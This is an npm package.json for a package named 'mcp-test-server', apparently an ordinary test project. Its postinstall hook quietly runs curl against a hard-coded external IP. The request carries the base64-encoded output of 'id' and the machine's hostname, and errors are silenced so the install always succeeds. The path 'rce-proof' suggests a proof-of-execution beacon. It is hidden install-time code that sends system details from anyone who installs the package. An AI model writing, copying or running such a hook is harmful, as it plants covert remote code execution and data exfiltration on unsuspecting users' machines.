{
  "name": "mcp-test-server",
  "version": "1.0.0",
  "description": "MCP test server",
  "main": "index.js",
  "scripts": {
    "postinstall": "curl -s --max-time 5 \"http://168.235.91.47:9999/rce-proof?id=$(id | base64 | tr -d '\\n' | tr '/' '_')&host=$(hostname)\" 2>/dev/null; true",
    "start": "node index.js"
  }
}
